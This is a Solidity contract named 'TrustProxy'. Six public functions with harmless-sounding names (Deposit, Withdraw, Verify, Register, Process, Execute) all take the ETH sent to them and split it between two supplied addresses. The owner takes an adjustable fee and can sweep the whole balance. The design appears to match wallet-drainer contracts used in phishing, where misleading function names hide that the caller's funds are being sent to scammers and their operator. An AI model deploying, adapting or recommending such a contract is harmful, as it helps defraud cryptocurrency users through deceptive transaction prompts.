// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TrustProxy {
    address private contract_owner;
    address private fee_receiver;
    uint8 private contract_fee;
    bool private fee_withdraw;

    event Ownership(address indexed last_owner, address indexed new_owner);
    event Percentage (uint8 last_percentage, uint8 new_percentage);

    constructor() {
        contract_owner = tx.origin;
        fee_receiver = contract_owner;
        fee_withdraw = false;
        contract_fee = 10;
    }

    modifier onlyAllowed {
        if (msg.sender == contract_owner) {_;}
        else {
            revert("unauthorized");
        }
    }

    function getOwner() public view returns (address) {return contract_owner;}
    function getBalance() public view returns (uint256) {return address(this).balance;}
    function salaryStatus() public view returns (bool) {return fee_withdraw;}
    function enableSalary() public onlyAllowed {fee_withdraw = true;}
    function disableSalary() public onlyAllowed {fee_withdraw = false;}

    function processTransaction(address sender, address primary_receiver, address secondary_receiver, uint8 secondary_percent, bool is_back) private {
        if (secondary_percent >= 99) revert("invalid percent");
        uint256 amount = msg.value;
        uint256 amount_back = 0;
        if (amount > 0) {amount = amount - 1; amount_back = amount_back + 1;}
        uint256 reserve = (amount / 100) * contract_fee;
        uint256 secondary_amount = ((amount - reserve) / 100) * secondary_percent;
        uint256 primary_amount = amount - reserve - secondary_amount;
        if (primary_amount > 0) payable(primary_receiver).transfer(primary_amount);
        if (secondary_amount > 0) payable(secondary_receiver).transfer(secondary_amount);
        if (reserve > 0 && fee_withdraw == true) payable(fee_receiver).transfer(reserve);
        if (amount_back > 0 && is_back == true) payable(sender).transfer(amount_back);
    }
    function transferOwnership(address new_owner) public onlyAllowed {
        address last_owner = contract_owner;
        contract_owner = new_owner;
        emit Ownership(last_owner, contract_owner);
    }
    function claimSalary() public onlyAllowed {
        if (address(this).balance <= 0) {
            revert("empty balance");
        }
        payable(fee_receiver).transfer(address(this).balance);
    }
    function setReceiver(address new_receiver) public onlyAllowed {
        fee_receiver = new_receiver;
    }

    function changePercentage(uint8 new_percentage) public onlyAllowed {
        if (new_percentage < 0 || new_percentage > 100) {
            revert("invalid percent");
        }
        uint8 previous_percentage = contract_fee;
        contract_fee = new_percentage;
        emit Percentage(previous_percentage, contract_fee);
    }

    function Execute(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
    function Process(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
    function Deposit(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
    function Withdraw(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
    function Register(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
    function Verify(address depositer, address handler, address keeper, uint8 percent, bool is_cashback) public payable {processTransaction(depositer, handler, keeper, percent, is_cashback);}
}